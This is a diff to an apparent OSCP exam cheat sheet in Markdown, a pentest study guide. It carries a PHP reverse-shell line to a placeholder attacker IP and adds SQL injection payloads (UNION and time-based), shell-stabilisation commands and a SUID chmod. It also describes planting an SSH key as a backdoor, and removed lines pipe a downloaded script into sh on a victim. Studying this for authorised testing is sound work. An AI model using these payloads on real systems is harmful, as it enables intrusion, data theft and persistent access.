@@ -1,12 +1,7 @@
 # OSCP-Cheatsheet
 The essential tools and procedure Kaoryu for OSCP  
 You can find important upload on top of page
-```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-```
-```bash
-export TERM=xterm
-```
+
 ## Global RoadMap for Pentest _For Linux_
 ### 1. Passive recognition
  - Command helpful for passive recognition 
@@ -147,7 +142,19 @@ you can use ls and get FILENAME
   ##### Top 3 injection breach
   - Command injection
   - XSS (Cross Site Scripting)
-  - SQL Injection
+  - SQL Injection  
+  Check in input web, url, or in request parameter if webapplication use sql 
+  ```SQL
+  SELECT * from artcile where id = 1 ;--(e.g: SELECT column_name from table_name where filter = 1)
+  ```
+  BINARY SQL Injection, if message error is false also its a good request sql
+  ```SQL
+  SELECT * from artcile where id = '1' UNION SELECT 1,2,3 where database() like 'sq%';--
+  ```
+  SLEEP SQL Injection, if request sleep 1 sec also its a good request sql
+  ```SQL
+  SELECT * from artcile where id = '1' UNION SELECT sleep(1),2 from information_schema.columns where table_name = 'sqli_one' and table_name = 'users' and column_name = 'id';--
+  ```
   ##### Top 4 non-secure application
   ##### Top 5 bad configuration
   ##### Top 6 composant vulnerability
@@ -160,6 +167,15 @@ you can use ls and get FILENAME
 ```php
 <?php exec("/bin/bash -c 'bash -i > /dev/tcp/ATTACKING-IP/1234 0>&1'");
 #simple balise php
+```
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")' #run pseudo temrinal with /bin/bash instance
+```
+```bash
+export TERM=xterm #determine type of terminal in use
+```
+```bash
+stty raw -echo; fg #foreground last processes in running
 ```
 #### 3.3 Password bruteforce
 - before bruteforce prefer to find a valid username because combination of bruteforce username and password is very very long
@@ -201,16 +217,15 @@ cat /etc/crontab
 - for tansfer script or folder with server/attacker machine :
 ```bash
 # Local network
-sudo python3 -m http.server 80 #Host
-curl 10.10.10.10/linpeas.sh | sh #Victim
+python3 -m http.server <port> #file owner
+wget http://<IP address>:<port>/file.txt #download file
 
 #Don't forget to give permission to execute script
-chmod +x script.sh
+chmod +x file.sh
+chmod +s file.sh #transfer suid of who execute this chmod cmmd
 ```
 - can automatize enumeration system with [linpeas.sh](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) or [LinEnum.sh](https://github.com/rebootuser/LinEnum)
-```bash
-./linpeas.sh
-```
+- PSPY64 is a good enumeration system, he permite to check in real time the running processes. 
 #### Backdoor
 - SSH backdoor this consiste at generate ssh keygen and put our public key in /home/user/.shh of your target
 - isn't secret
